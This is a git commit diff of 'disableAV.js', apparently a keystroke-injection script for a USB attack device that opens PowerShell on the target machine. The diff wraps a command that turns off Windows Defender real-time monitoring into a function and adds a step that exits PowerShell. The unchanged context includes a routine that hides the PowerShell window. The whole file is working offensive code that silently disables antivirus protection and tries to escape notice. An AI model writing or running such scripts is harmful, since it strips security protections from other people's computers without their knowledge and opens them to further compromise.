939b24ab0fc6d780fcbdc40c6fe4694ab565c9c5
Nexr0n <39227048+Nexr0n@users.noreply.github.com>
2020-05-25 11:03:43 -0700

    Update disableAV.js

--- disableAV.js
+++ disableAV.js
@@ -15,9 +15,18 @@ function hidePS() {
 	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
   	press("ENTER");
 }
+function disableAV() {
+	type("Set-MpPreference -DisableRealtimeMonitoring $true")
+	press("ENTER");
+	delay(200);
+}
+function exitPS() {
+	type("exit")
+	press("ENTER");
+}
 layout('de');
 fast();
 startPS();
 //hidePS();
-type("Set-MpPreference -DisableRealtimeMonitoring $true")
-press("ENTER");
+disableAV();
+exitPS();
